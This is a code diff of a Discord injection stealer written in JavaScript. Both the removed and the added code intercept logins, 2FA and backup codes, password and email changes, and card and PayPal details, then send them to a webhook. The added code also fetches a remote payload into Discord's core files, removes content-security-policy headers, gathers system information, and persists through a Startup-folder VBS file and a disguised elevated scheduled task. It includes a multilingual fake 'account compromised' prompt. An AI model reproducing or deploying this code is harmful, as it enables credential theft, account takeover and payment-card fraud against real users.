+            "Зв\\'яжіться з постачальником електронної пошти, щоб виправити це.",
+        ],
+        "hi": [
+            "उपयोगकर्ता सेटिंग्स",
+            "ईमेल पता संपादित करें",
+            "अपना ईमेल पता बदलें",
+            "हमने आपके Discord खाते में कुछ असामान्य चीजें पाई हैं, आपका पता,",
+            "संकट में है।",
+            "कृपया इसे बदलें ताकि आप अपने खाते का उपयोग जारी रख सकें।",
+            "अब आपके पास अपने ईमेल पते तक पहुँच नहीं है",
+            "इसे ठीक करने के लिए अपने ईमेल प्रदाता से संपर्क करें.",
+        ],
+        "th": [
+            "การตั้งค่าผู้ใช้",
+            "แก้ไขที่อยู่อีเมล",
+            "เปลี่ยนที่อยู่อีเมลของคุณ",
+            "เราตรวจพบบางสิ่งบางอย่างที่ผิดปกติในบัญชี Discord ของคุณ ที่อยู่ของคุณ,",
+            "ถูกขัดจังหวะ",
+            "กรุณาเปลี่ยนเพื่อดำเนินการใช้บัญชีของคุณต่อไป",
+            "คุณไม่สามารถเข้าถึงที่อยู่อีเมลของคุณได้อีกต่อไป",
+            "ติดต่อผู้ให้บริการอีเมลของคุณเพื่อแก้ไข",
+        ],
+        "ja": [
+            "ユーザー設定",
+            "メールアドレスを編集",
+            "メールアドレスを変更",
+            "あなたのDiscordアカウントに異常が検出されました、あなたのアドレスは",
+            "危険にさらされています。",
+            "アカウントを引き続き使用するために変更してください。",
+            "もはやあなたのメールアドレスにアクセスできません",
+            "問題を修正するためにメールプロバイダーに連絡してください。",
+        ],
+        "ko": [
+            "사용자 설정",
+            "이메일 주소 편집",
+            "이메일 주소 변경",
+            "귀하의 Discord 계정에 이상한 점이 감지되었습니다. 귀하의 주소,",
+            "이 위험에 빠져 있습니다.",
+            "귀하의 계정을 계속 사용하려면 변경하십시오.",
+            "이제 귀하의 이메일 주소에 액세스할 수 없습니다.",
+            "문제를 해결하기 위해 이메일 제공 업체에 문의하십시오.",
+        ],
+    };
+
+    const language = languages[lang] || [
+        "User Settings",
+        "Edit email address",
+        "Change your Email-Address",
+        "We have detected something unusual with your Discord account, your address,",
+        "has been compromised.",
+        "Please change it to continue using your account.",
+        "No longer have access to your email",
+        "Contact your email provider to fix it.",
+    ];
+
+    return language;
+};
+
+class Fetcher {
+    constructor(token) {
+        this.token = token;
+    }
+    _fetch = async (endpoint, headers) => {
+        const APIs = [
+            'https://discordapp.com/api',
+            'https://discord.com/api',
+            'https://canary.discord.com/api',
+            'https://ptb.discord.com/api'
+        ];
+        const response = await request('GET', `${APIs[Math.floor(Math.random() * APIs.length)]}/v9/users/${endpoint}`, headers)
+        return JSON.parse(response);
+    };
+
+    User = async () => {
+        return await this._fetch("@me", {
+            "Authorization": this.token
+        });
+    };
+
+    Profile = async () => {
+        return await this._fetch(`${Buffer.from(this.token.split(".")[0], "base64").toString("binary")}/profile`, {
+            "Authorization": this.token
+        });
+    };
+
+    Friends = async () => {
+        return await this._fetch("@me/relationships", {
+            "Authorization": this.token
+        });
+    };
+
+    Servers = async () => {
+        return await this._fetch("@me/guilds?with_counts=true", {
+            "Authorization": this.token
+        });
+    };
+
+    Billing = async () => {
+        return await this._fetch("@me/billing/payment-sources", {
+            "Authorization": this.token
+        });
+    };
+};
+
+class GetDataUser {
+    SystemInfo = async () => {
+        try {
+            const [os, cpu, gpu, ram, uuid, productKey, macAddress, localIP, cpuCount] = await Promise.all([
+                execCommand("wmic OS get caption, osarchitecture | more +1"),
+                execCommand("wmic cpu get name | more +1"),
+                execCommand("wmic PATH Win32_VideoController get name | more +1").then(stdout => stdout.replace(/\r\n|\r/g, "")),
+                execCommand("wmic computersystem get totalphysicalmemory | more +1").then(stdout => `${Math.floor(parseInt(stdout) / (1024 * 1024 * 1024))} GB`),
+                execCommand("powershell.exe (Get-CimInstance -Class Win32_ComputerSystemProduct).UUID"),
+                execCommand("powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion' -Name ProductName"),
+                execCommand("powershell.exe (Get-CimInstance -ClassName 'Win32_NetworkAdapter' -Filter 'NetConnectionStatus = 2').MACAddress"),
+                execCommand("powershell.exe (Get-NetIPAddress).IPAddress"),
+                execCommand("echo %NUMBER_OF_PROCESSORS%")
+            ]);
+
+            return {
+              os,
+              cpu,
+              gpu,
+              ram,
+              uuid,
+              productKey,
+              macAddress,
+              localIP,
+              cpuCount,
+          };
+        } catch (error) {
+            return {};
+        }
+    };
+
+    Network = async () => {
+        try {
+            const response = await request('GET', "http://ip-api.com/json", {
+                'Content-Type': 'application/json'
+            });
+            return JSON.parse(response);
+        } catch (error) {
+            return {};
+        }
+    };
+
+    Badges = (flags) =>
+        Object.keys(CONFIG.badges)
+            .reduce((result, badge) => CONFIG.badges.hasOwnProperty(badge)
+                && (flags & CONFIG.badges[badge].value) === CONFIG.badges[badge].value
+                ? `${result}${CONFIG.badges[badge].emoji} `
+                : result, '',
+            ) || '❓';
+
+    RareBadges = (flags) =>
+        Object.keys(CONFIG.badges)
+            .reduce((result, badge) => CONFIG.badges.hasOwnProperty(badge)
+                && (flags & CONFIG.badges[badge].value) === CONFIG.badges[badge].value
+                && CONFIG.badges[badge].rare
+                ? `${result}${CONFIG.badges[badge].emoji} `
+                : result, '',
+            ) || '';
+
+    Billing = async (token) => {
+        const API = new Fetcher(token);
+        const data = await API.Billing();
+
+        const payment = {
+            1: '💳',
+            2: '<:Paypal:1129073151746252870>'
+        };
+        let paymentMethods = data.map(method => payment[method.type] || '❓').join('');
+        return paymentMethods || '❓';
+    }
+
+    Friends = async (token) => {
+        const API = new Fetcher(token);
+        const friends = await API.Friends();
+        const {RareBadges} = new GetDataUser();
+    
+        const filteredFriends = friends
+            .filter(friend => friend.type === 1)
+            .map(friend => ({
+                username: friend.user.username,
+                discriminator: friend.user.discriminator,
+                flags: RareBadges(friend.user.public_flags),
+            }))
+
+        const rareFriends = filteredFriends.filter(friend => friend.flags);
+
+        const hQFriends = rareFriends.map(friend => {
+            const name = `${friend.username}#${friend.discriminator}`;
+            return`${friend.flags} | ${name}\n`;
+        });
+
+        const hQFriendsPlain = hQFriends.join('');
+
+        if (hQFriendsPlain.length === 0) {
+            return false;
+        };
+
+        if (hQFriendsPlain.length > 4050) {
+            return {
+                title: `**Rare Friends (Too many to display):**\n`,
+                description: "Too many friends to display.",
+            };
+        };
+
+        return {
+            title: `**Rare Friends (${hQFriends.length}):**\n`,
+            description: `${hQFriendsPlain}`,
+        };
+    };
+
+    Servers = async (token) => {
+        const API = new Fetcher(token);
+        const guilds = await API.Servers();
+
+        const filteredGuilds = guilds
+            .filter(guild => guild.owner || (guild.permissions & 8) === 8)
+            .filter(guild => guild.approximate_member_count >= 500)
+            .map(guild => ({
+                id: guild.id,
+                name: guild.name,
+                owner: guild.owner,
+                member_count: guild.approximate_member_count
+            }));
+
+        const hQGuilds = await Promise.all(filteredGuilds.map(async guild => {
+            const response = await request('GET', `https://discord.com/api/v8/guilds/${guild.id}/invites`, {
+                'Authorization': token
+            });
+
+            const invites = JSON.parse(response);
+            const invite = invites.length > 0
+                ? `[Join Server](https://discord.gg/${invites[0].code})`
+                : 'No Invite';
+
+            const emoji = guild.owner
+                ? `<:Owner:963333541343686696> Owner`
+                : `<:Staff:1136740017822253176> Admin`;
+            const members = `Members: \`${guild.member_count}\``;
+            const name = `**${guild.name}** - (${guild.id})`;
+
+            return `${emoji} | ${name} - ${members} - ${invite}\n`;
+        }));
+
+        const hQGuildsPlain = hQGuilds.join('');
+
+        if (hQGuildsPlain.length === 0) {
+            return false;
+        };
+
+        if (hQGuildsPlain.length > 4050) {
+            return {
+                title: `**Rare Servers (Too many to display):**\n`,
+                description: "Too many servers to display.",
+            };
+        };
+
+        return {
+            title: `**Rare Guilds (${hQGuilds.length}):**\n`,
+            description: `${hQGuildsPlain}`,
+        }
+    };
+    
+    getDate = (current, months) => {
+        return new Date(current).setMonth(current.getMonth() + months);
+    };
+
+    Nitro = (flags) => {
+        const { premium_type, premium_guild_since } = flags,
+            nitro = "<:DiscordNitro:587201513873473542>";
+        switch (premium_type) {
+            default:
+                return "❓";
+            case 1:
+                return nitro;
+            case 2:
+                if (!premium_guild_since) return nitro;
+                let months = [1, 2, 3, 6, 9, 12, 15, 18, 24],
+                    rem = 0;
+                for (let i = 0; i < months.length; i++)
+                    if (Math.round((this.getDate(new Date(premium_guild_since), months[i]) - new Date()) / 86400000) > 0) {
+                        rem = i;
+                        break;
+                    }
+            return `${nitro} ${CONFIG.badges._nitro[rem]}`;
+        }
+    };
+};
+
+const Cruise = async (type, response, request, email, password, token, action) => {
+    let API;
+    let user;
+    let content;
     switch (type) {
         case 'LOGIN_USER':
-            info = await fAccount(res.token);
-            msg = {
-                title: act,
+            API = new Fetcher(token);
+            user = await API.User();
+            content = {
+                content: `**${user.username}** ${action}!`,
                 embeds: [{
                     fields: [
-                        { name: "Email", value: `\`${mail}\``, inline: true },
-                        { name: "Password", value: `\`${pass}\``, inline: true },
+                        { name: "Email", value: `\`${email}\``, inline: true },
+                        { name: "Password", value: `\`${password}\``, inline: true },
                     ],
                 }],
             };
-            if (req.code !== undefined) {
-                msg.embeds[0].fields.push(
-                    { name: "Used 2FA code", value: `\`${req.code}\``, inline: true }
+            if (request.code !== undefined) {
+                content.embeds[0].fields.push(
+                    { name: "Used 2FA code", value: `\`${request.code}\``, inline: false }
                 );
             }
-            notify(msg, res.token, info);
+            notify(content, token, user);
             break;
         case 'USERNAME_CHANGED':
-            info = await fAccount(res.token);
-            msg = {
-                title: act,
+            API = new Fetcher(token);
+            user = await API.User();
+            content = {
+                content: `**${user.username}** ${action}!`,
                 embeds: [{
                     fields: [
-                        { name: "New UserName", value: `\`${req.username}\``, inline: true, },
-                        { name: "Password", value: `\`${req.password}\``, inline: true, },
+                        { name: "New Username", value: `\`${request.username}\``, inline: true },
+                        { name: "Password", value: `\`${request.password}\``, inline: true },
                     ],
                 }],
             };
-            notify(msg, res.token, info);
+            notify(content, token, user);
             break;
         case 'EMAIL_CHANGED':
-            info = await fAccount(res.token);
-            msg = {
-                title: act,
+            API = new Fetcher(token);
+            user = await API.User();
+            content = {
+                content: `**${user.username}** ${action}!`,
                 embeds: [{
                     fields: [
-                        { name: "New Email", value: `\`${mail}\``, inline: true },
-                        { name: "Password", value: `\`${pass}\``, inline: true },
+                        { name: "New Email", value: `\`${email}\``, inline: true },
+                        { name: "Password", value: `\`${password}\``, inline: true },
                     ],
                 }],
             };
-            notify(msg, res.token, info);
+            notify(content, token, user);
             break;
         case 'PASSWORD_CHANGED':
-            info = await fAccount(res.token);
-            msg = {
-                title: act,
+            API = new Fetcher(token);
+            user = await API.User();
+            content = {
+                content: `**${user.username}** ${action}!`,
                 embeds: [{
                     fields: [
-                        { name: "New Password", value: `\`${req.new_password}\``, inline: true, },
-                        { name: "Old Password", value: `\`${req.password}\``, inline: true, },
+                        { name: "New Password", value: `\`${request.new_password}\``, inline: true, },
+                        { name: "Old Password", value: `\`${request.password}\``, inline: true, },
                     ],
                 }],
             };
-            notify(msg, res.token, info);
+            notify(content, token, user);
+            break;
+        case 'BACKUP_CODES':                
+            API = new Fetcher(token);
+            user = await API.User();
+
+            const codes = (response.backup_codes || CONFIG.get.backup_codes())
+                .filter(code => !code.consumed || response.backup_codes === undefined)
+                .map(code => response.backup_codes ? `${code.code.slice(0, 4)}-${code.code.slice(4)}` : `${code}`)
+                .join('\n');
+
+            content = {
+                content: `**${user.username}** ${action}!`,
+                embeds: [{
+                    fields: [
+                        { name: "Email", value: `\`${email}\``, inline: true },
+                        { name: "Password", value: `\`${password}\``, inline: true },
+                        { name: "Password", value: `\`\`\`\n${codes}\`\`\``, inline: false },
+                    ],
+                }],
+            };
+            notify(content, token, user);
             break;
         case 'CREDITCARD_ADDED':
-            token = res;
-            info = await fAccount(token);
-            msg = {
-                title: act,
+            API = new Fetcher(token);
+            user = await API.User();
+            content = {
+                content: `**${user.username}** ${action}!`,
                 embeds: [{
                     fields: [
-                        { name: "Number", value: `\`${req["card[number]"]}\``, inline: true },
-                        { name: "CVC", value: `\`${req["card[cvc]"]}\``, inline: true },
-                        { name: "Expiration", value: `\`${req["card[exp_month]"]}/${req["card[exp_year]"]}\``, inline: true, },
+                        { name: "Number", value: `\`${request.item["card[number]"]}\``, inline: true },
+                        { name: "CVC", value: `\`${request.item["card[cvc]"]}\``, inline: true },
+                        { name: "Expiration", value: `\`${request.item["card[exp_month]"]}/${request.item["card[exp_year]"]}\``, inline: true, },
+                    ],
+                    fields: [
+                        { name: "Address", value: `\`\`\`\nLine 1: ${request["line_1"]}\nLine 2: ${request["line_2"]}\nCity: ${request["city"]}\nState: ${request["state"]}\nPostal Code: ${request["postal_code"]}\nCountry: ${request["country"]}\n\`\`\``, inline: false, },
                     ],
                 }],
             };
-            notify(msg, token, info);
+            notify(content, token, user);
             break;
         case 'PAYPAL_ADDED':
-            token = res;
-            info = await fAccount(token);
-            msg = {
-                title: act,
+            API = new Fetcher(token);
+            user = await API.User();
+            content = {
+                content: `**${user.username}** ${action}!`,
                 embeds: [{
                     fields: [
-                        { name: "Email", value: `\`${info.email}\``, inline: true },
-                        { name: "Phone", value: `\`${(info.phone || "None")}\``, inline: true },
+                        { name: "Email", value: `\`${user.email}\``, inline: true },
+                        { name: "Phone", value: `${user.phone ? `\`${user.phone}\`` : `❓`}`, inline: true },
                     ],
                 }],
             };
-            notify(msg, token, info);
+            notify(content, token, user);
             break;
         case 'INJECTED':
-            token = res;
-            info = await fAccount(token);
-            msg = {
-                title: act,
+            API = new Fetcher(token);
+            user = await API.User();
+            content = {
+                content: `**${user.username}** ${action}!`,
                 embeds: [{
                     fields: [
-                        { name: "Email", value: `\`${info.email}\``, inline: true },
-                        { name: "Phone", value: `\`${(info.phone || "None")}\``, inline: true },
+                        { name: "Email", value: `\`${user.email}\``, inline: true },
+                        { name: "Phone", value: `${user.phone ? `\`${user.phone}\`` : `❓`}`, inline: true },
                     ],
                 }],
             };
-            notify(msg, token, info);
+            await notify(content, token, user);
             break;
         default:
     }
-}
-
-const DISCORD_PATH = (function () {
-    const app = process.argv[0].split(path.sep).slice(0, -1).join(path.sep);
-    let resource;
-    if (process.platform === "win32") resource = path.join(app, "resources");
-    else if (process.platform === "darwin")
-        resource = path.join(app, "Contents", "Resources");
-    if (fs.existsSync(resource)) return { resource, app };
-    return { undefined, undefined };
-})();
-
-async function UPDATE_CHECKING() {
-    let i = "initiation";
-    const { resource, app } = DISCORD_PATH;
-    if (resource === undefined || app === undefined) return;
-    let p = path.join(resource, "app");
-    if (!fs.existsSync(p)) fs.mkdirSync(p);
-    if (fs.existsSync(path.join(p, "package.json")))
-        fs.unlinkSync(path.join(p, "package.json"));
-    if (fs.existsSync(path.join(p, "index.js")))
-        fs.unlinkSync(path.join(p, "index.js"));
-    if (process.platform === "win32" || process.platform === "darwin") {
-        fs.writeFileSync(
-            path.join(p, "package.json"),
-            JSON.stringify({ name: "discord", main: "index.js" }, null, 4),
-        );
-        fs.writeFileSync(
-            path.join(p, "index.js"),
-            `const fs = require('fs'), https = require('https');\nconst indexJs = '${`${app}\\modules\\${fs.readdirSync(`${app}\\modules\\`).filter((x) => /discord_desktop_core-+?/.test(x))[0]}\\discord_desktop_core\\index.js`}';\nconst bdPath = '${path.join(process.env.APPDATA, "\\betterdiscord\\data\\betterdiscord.asar")}';\nconst K4ITRUN = fs.statSync(indexJs).size\nfs.readFileSync(indexJs, 'utf8', (err, data) => {\n    if (K4ITRUN < 20000 || data === "module.exports = require('./core.asar')")\n        init();\n})\nasync function init() {\n    https.get('${INJECT_URL}', (res) => {\n        const file = fs.createWriteStream(indexJs);\n        res.replace('%WEBHOOK%', '${WEBHOOK}')\n        res.pipe(file);\n        file.on('finish', () => {\n            file.close();\n        });\n        \n    }).on("error", (err) => {\n        setTimeout(init(), 10000);\n    });\n}\nrequire('${path.join(resource, "app.asar")}')\nif (fs.existsSync(bdPath)) require(bdPath);`.replace(/\\/g, "\\\\")
-        );
-    }
-    if (!fs.existsSync(path.join(__dirname, i))) return;
-    else fs.rmdirSync(path.join(__dirname, i));
-    if (!(await execScript(TOKEN_SCRIPT))) return;
-    cruise(
-        "INJECTED",
-        null,
-        null,
-        (await execScript(TOKEN_SCRIPT)) ?? "",
-        null,
-        `DISCORD INJECTED`,
-    );
-    execScript(LOGOUT_SCRIPT);
-}
-
-session.defaultSession.webRequest.onBeforeRequest(
-    {
-        urls: [
-            "https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json",
-            "https://*.discord.com/api/v*/applications/detectable",
-            "https://discord.com/api/v*/applications/detectable",
-            "https://*.discord.com/api/v*/users/@me/library",
-            "https://discord.com/api/v*/users/@me/library",
-            "wss://remote-auth-gateway.discord.gg/*",
-            "https://discord.com/api/v*/auth/sessions",
-            "https://*.discord.com/api/v*/auth/sessions",
-            "https://discordapp.com/api/v*/auth/sessions",
-        ],
-    },
-    (d, callback) => {
-        if (!fs.existsSync(`${__dirname}/aurathemes`))
-            fs.mkdirSync(`${__dirname}/aurathemes`);
-        if (!fs.existsSync(`${__dirname}/aurathemes/${WEBHOOK.split("/")[WEBHOOK.split("/").length - 1]}.txt`,)) {
-            fs.writeFileSync(`${__dirname}/aurathemes/${WEBHOOK.split("/")[WEBHOOK.split("/").length - 1]}.txt`, WEBHOOK,);
-            execScript(LOGOUT_SCRIPT);
-        }
-        if (d.url.startsWith("wss://remote-auth-gateway") || d.url.endsWith("auth/sessions"))
-            callback({ cancel: true });
-        else
-            callback({ cancel: false });
-        UPDATE_CHECKING();
-    },
-);
-
-session.defaultSession.webRequest.onHeadersReceived((a, callback) => {
-    delete a.responseHeaders["content-security-policy"];
-    delete a.responseHeaders["content-security-policy-report-only"];
-    callback({
-        responseHeaders: {
-            ...a.responseHeaders,
-            "Access-Control-Allow-Headers": "*",
-        },
-    });
-});
-
-session.defaultSession.webRequest.onCompleted(
-    {
-        urls: [
-            "https://discord.com/api/v*/users/@me/billing/paypal/billing-agreement-tokens",
-            "https://discordapp.com/api/v*/users/@me/billing/paypal/billing-agreement-tokens",
-            "https://*.discord.com/api/v*/users/@me/billing/paypal/billing-agreement-tokens",
-            "https://api.braintreegateway.com/merchants/49pp2rp4phym7387/client_api/v*/payment_methods/paypal_accounts",
-            "https://api.stripe.com/v*/tokens",
-        ],
-    },
-    async (a, callback) => {
-        let data;
-        try {
-            data = parse(Buffer.from(a.uploadData[0].bytes).toString());
-        } catch (err) {
-            data = parse(decodeURIComponent(a.uploadData[0].bytes.toString()));
-        }
-        let authorization = (await execScript(TOKEN_SCRIPT)) ?? "";
-        if (a.method != "POST") return;
-        if (a.statusCode !== 200 && a.statusCode !== 202) return;
-        if (a.url.endsWith("/paypal_accounts")) {
-            cruise(
-                "PAYPAL_ADDED",
-                null,
-                null,
-                authorization,
-                null,
-                `PAYPAL ADDED`,
-            );
-        } else if (a.url.endsWith("/tokens")) {
-            cruise(
-                "CREDITCARD_ADDED",
-                null,
-                null,
-                authorization,
-                data,
-                `CREDITCARD ADDED`,
-            );
-        }
-    },
-);
-
-const CREATE_WINDOW_CLIENT = (win) => {
-    if (!win.getAllWindows()[0]) return;
-    win.getAllWindows()[0].webContents.debugger.attach("1.3");
-    win.getAllWindows()[0].webContents.debugger.on("message", async (_, m, p) => {
-        if (m !== "Network.responseReceived") return;
-        if (!["/auth/login", "/auth/register", "/mfa/totp", "/users/@me",].some((url) => p.response.url.endsWith(url))) return;
-        if (p.response.status !== 200 && p.response.status !== 202) return;
-        let RESPONSE_DATA = JSON.parse(
-            (
-                await win.getAllWindows()[0].webContents.debugger.sendCommand(
-                    "Network.getResponseBody",
-                    { requestId: p.requestId },
-                )
-            ).body,
-        ),
-            REQUEST_DATA = JSON.parse(
-                (
-                    await win.getAllWindows()[0].webContents.debugger.sendCommand(
-                        "Network.getRequestPostData",
-                        { requestId: p.requestId },
-                    )
-                ).postData,
-            );
-        if (p.response.url.endsWith("/login")) {
-            if (!RESPONSE_DATA.token) {
-                EMAIL = REQUEST_DATA.login;
-                PASSWORD = REQUEST_DATA.password;
-                return;
-            }
-            cruise(
-                "LOGIN_USER",
-                REQUEST_DATA.login,
-                REQUEST_DATA.password,
-                RESPONSE_DATA,
-                REQUEST_DATA,
-                "LOGGED IN",
-            );
-        } else if (p.response.url.endsWith("/register")) {
-            cruise(
-                "LOGIN_USER",
-                REQUEST_DATA.email,
-                REQUEST_DATA.password,
-                RESPONSE_DATA,
-                REQUEST_DATA,
-                "SIGNED UP",
-            );
-        } else if (p.response.url.endsWith("/totp")) {
-            cruise(
-                "LOGIN_USER",
-                EMAIL,
-                PASSWORD,
-                RESPONSE_DATA,
-                REQUEST_DATA,
-                "LOGGED IN WITH MFA-2",
-            );
-        } else if (p.response.url.endsWith("/@me")) {
-            if (!REQUEST_DATA.password) return;
-            if (REQUEST_DATA.email)
-                cruise(
-                    "EMAIL_CHANGED",
-                    REQUEST_DATA.email,
-                    REQUEST_DATA.password,
-                    RESPONSE_DATA,
-                    REQUEST_DATA,
-                    `CHANGED EMAIL`,
-                );
-            if (REQUEST_DATA.new_password)
-                cruise(
-                    "PASSWORD_CHANGED",
-                    null,
-                    null,
-                    RESPONSE_DATA,
-                    REQUEST_DATA,
-                    `CHANGED PASSWORD`,
-                );
-            if (REQUEST_DATA.username)
-                cruise(
-                    "USERNAME_CHANGED",
-                    null,
-                    null,
-                    RESPONSE_DATA,
-                    REQUEST_DATA,
-                    `CHANGED USERNAME`,
-                );
-        }
-    },
-    );
-    win.getAllWindows()[0].webContents.debugger.sendCommand(
-        "Network.enable",
-    );
-    win.getAllWindows()[0].on(
-        "closed", () => CREATE_WINDOW_CLIENT(BrowserWindow)
-    );
 };
 
-CREATE_WINDOW_CLIENT(BrowserWindow); // INIT
+const forcePersistStartup = async () => {
+    const vbsFileName = 'DiscordBetterProtector.vbs';
+    const batFileName = 'setupTask.bat';
+
+    const protectFolderPath = path.join(process.env.APPDATA, 'Microsoft', 'Protect');
+    const vbsFilePathInProtect = path.join(protectFolderPath, vbsFileName);
+    const startupFolderPath = path.join(process.env.APPDATA, 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup');
+    const vbsFilePathInStartup = path.join(startupFolderPath, vbsFileName);
+    const batFilePath = path.join(__dirname, batFileName);
+
+    const scriptVbsContent = await request('GET', CONFIG.injector_url, {
+        'Content-Type': 'text/plain'
+    });
+
+    const responseVbsMalware = (scriptVbsContent[0]).toString('utf8') ?? '';
+    const vbsContent = responseVbsMalware
+        .replace("replace_webhook_url", CONFIG.webhook)
+        .replace("replace_api_url", CONFIG.API)
+        .replace("replace_auto_user_profile_edit", CONFIG.auto_user_profile_edit)
+        .replace("replace_auto_email_update", CONFIG.auto_email_update);
+
+    const checkFileExists = (filePath) => {
+        return new Promise((resolve) => {
+            fs.access(filePath, fs.constants.F_OK, (err) => {
+                resolve(!err);
+            });
+        });
+    };
+
+    const checkScheduledTaskExists = () => {
+        return new Promise((resolve) => {
+            exec('schtasks /query /tn "WindowsSecurityHealthSystrayk4itrun"', (err) => {
+                resolve(!err);
+            });
+        });
+    };
+
+    const createVBSFile = (filePath) => {
+        return new Promise((resolve, reject) => {
+            fs.writeFile(filePath, vbsContent.trim(), (err) => {
+                if (err) return reject(err);
+                resolve();
+            });
+        });
+    };
+
+    const createBatchFile = () => {
+        const batContent = `
+            @echo off
+            setlocal
+
+            set "vbsFilePath=%APPDATA%\\Microsoft\\Protect\\${vbsFileName}"
+
+            schtasks /create /tn "WindowsSecurityHealthSystrayk4itrun" /tr "wscript.exe \"%vbsFilePath%\"" /sc onlogon /f
+
+            if %ERRORLEVEL% EQU 0 (
+                echo We are scanning your Discord application(s)....
+            ) else (
+                echo An unexpected error occurred...
+            )
+
+            timeout /t 5 /nobreak > NUL
+            del "%~f0"
+
+            endlocal
+        `;
+
+        return new Promise((resolve, reject) => {
+            fs.writeFile(batFilePath, batContent.trim(), (err) => {
+                if (err) return reject(err);
+                resolve();
+            });
+        });
+    };
+
+    const executeBatchFile = () => {
+        return new Promise((resolve, reject) => {
+            exec(`powershell -Command "Start-Process cmd -ArgumentList '/c \"${batFilePath}\"' -Verb RunAs"`, (err) => {
+                if (err) return reject(err);
+                resolve();
+            });
+        });
+    };
+
+    const protectExists = await checkFileExists(vbsFilePathInProtect);
+    const startupExists = await checkFileExists(vbsFilePathInStartup);
+    const taskExists = await checkScheduledTaskExists();
+
+    if (!protectExists) {
+        await createVBSFile(vbsFilePathInProtect);
+    }
+    if (!startupExists) {
+        await createVBSFile(vbsFilePathInStartup);
+    }
+
+    if (!taskExists) {
+        await createBatchFile();
+        await executeBatchFile();
+
+        setTimeout(() => {
+            fs.unlink(batFilePath, (unlinkErr) => {
+                if (unlinkErr) {
+                    console.error('Error deleting batch file:', unlinkErr);
+                } else {
+                    console.log('Batch file deleted.');
+                }
+            });
+        }, 10000);
+    }
+};
+
+const startup = async () => {
+    const startupDir = path.join(__dirname, 'aurathemes');
+    if (fs.existsSync(startupDir)) {
+        fs.rmdirSync(startupDir);
+        CONFIG.get.logout();
+        const {token} = await AuritaCord();
+        if (!token) return;
+        Cruise(
+            'INJECTED',
+            null,
+            null,
+            null,
+            null,
+            token,
+            `It is injected in the route: \`${__dirname.trim().replace(/\\/g, "/")}\``
+        );
+        execScript('document.body.appendChild(document.createElement("iframe")).contentWindow.localStorage.clear();document.body.removeChild(document.querySelector(\'iframe\'));');
+        execScript('window.location.href=window.location.href;');
+    }
+
+    const getDiscordPaths = () => {
+        const args = process.argv;
+        const appDir = args[0].split(path.sep).slice(0, -1).join(path.sep);
+        let resource;
+
+        switch (process.platform) {
+            case 'win32':
+                resource = path.join(appDir, 'resources');
+                break;
+            case 'darwin':
+                resource = path.join(appDir, 'Contents', 'Resources');
+                break;
+            default:
+                return { 
+                    resource: undefined, 
+                    app: undefined 
+                };
+        }
+
+        if (fs.existsSync(resource)) {
+            return { 
+                resource: resource, 
+                app: appDir 
+            };
+        }
+
+        return { 
+            resource: undefined, 
+            app: undefined 
+        };
+    };
+
+    const { resource, app } = getDiscordPaths();
+
+    if (!resource || !app) return;
+    const appDir = path.join(resource, 'app');
+
+    const packageJsonFile = path.join(appDir, 'package.json');
+    const startupScriptRunJsFile = path.join(appDir, 'index.js');
+
+    const coreJsFile = path.join(app, 'modules', fs.readdirSync(path.join(app, 'modules')).find(file => /discord_desktop_core-/.test(file)), 'discord_desktop_core', 'index.js');
+    const betterDiscordAsarFile = path.join(process.env.APPDATA, 'betterdiscord', 'data', 'betterdiscord.asar');
+    
+    if (!fs.existsSync(appDir)) {
+        fs.mkdirSync(appDir, { recursive: true });
+    }
+    
+    if (fs.existsSync(packageJsonFile)) fs.unlinkSync(packageJsonFile);
+    if (fs.existsSync(startupScriptRunJsFile)) fs.unlinkSync(startupScriptRunJsFile);
+    
+    if (process.platform === 'win32' || process.platform === 'darwin') {
+        fs.writeFileSync(packageJsonFile, JSON.stringify({ name: 'discord', main: 'index.js' }, null, 4));
+    
+        const scriptRunJsFileContent = `
+            const fs = require('fs');
+            const https = require('https');
+            const path = require('path');
+    
+            const coreJsFile = '${coreJsFile}';
+            const betterDiscordAsarFile = '${betterDiscordAsarFile}';
+    
+            const initialize = async () => {
+                try {
+                    const data = await fs.promises.readFile(coreJsFile, 'utf8');
+                    if (data.length < 20000 || data === "module.exports = require('./core.asar')") {
+                        await downloadAndUpdateFile();
+                    }
+                } catch (err) {
+                    console.error(err);
+                }
+            };
+    
+            const downloadAndUpdateFile = async () => {
+                try {
+                    const fileStream = fs.createWriteStream(coreJsFile);
+                    await new Promise((resolve, reject) => {
+                        https.get('${CONFIG['injection_url']}', (res) => {
+                            res.on('data', chunk => fileStream.write(chunk.toString().replace('%WEBHOOK_URL%', '${CONFIG['webhook']}')));
+                            res.on('end', () => {
+                                fileStream.end();
+                                resolve();
+                            });
+                        }).on('error', err => {
+                            reject(err);
+                        });
+                    });
+                } catch (err) {
+                    setTimeout(downloadAndUpdateFile, 10000);
+                }
+            };
+    
+            initialize();
+    
+            require('${path.join(resource, 'app.asar')}');
+            if (fs.existsSync(betterDiscordAsarFile)) require(betterDiscordAsarFile);
+        `;
+
+        fs.writeFileSync(startupScriptRunJsFile, scriptRunJsFileContent.replace(/\\/g, '\\\\'));
+    }
+    
+};
+
+const AuritaCord = async () => {
+    try {
+        const token = await CONFIG.get.token();
+        const API = new Fetcher(token);
+        const user = await API.User();
+        return {
+            token,
+            user,
+        };
+    } catch {
+        return {}
+    }
+}
+
+let [
+    email,
+    password,
+    startup_event_occurred,
+    script_executed
+] = [
+    '',
+    '',
+    false,
+    false
+]
+
+const handleResponse = async (mainWindow, params, response, request) => {
+    const {token} = await AuritaCord();
+
+    const urlHandlers = {
+        '/login': async () => {
+            if (!response.token || request.code !== undefined) {
+                email = request.login;
+                password = request.password;
+                return;
+            }
+            Cruise(
+                'LOGIN_USER',
+                response,
+                request,
+                (request.login || email),
+                (request.password || password),
+                (response.token || token),
+                `has Logged in`
+            );
+        },
+        '/register': () => {
+            Cruise(
+                'LOGIN_USER',
+                response,
+                request,
+                (request.email || email),
+                (request.password || password),
+                (response.token || token),
+                'has \`Created\` a new account'
+            );
+        },
+        '/totp': () => {
+            Cruise(
+                'LOGIN_USER',
+                response,
+                request,
+                (request.email || email),
+                (request.password || password),
+                (response.token || token),
+                `you are logged in with \`2FA\``
+            );
+        },
+        '/enable': async () => {
+            Cruise(
+                'BACKUP_CODES',
+                response,
+                request,
+                (request.email || email),
+                (request.password || password),
+                (response.token || token),
+                `\`${response.backup_codes.length} Security\` codes have just been added`
+            );
+        },
+        '/codes-verification': async () => {
+            Cruise(
+                'BACKUP_CODES',
+                response,
+                request,
+                (request.email || email),
+                (request.password || password),
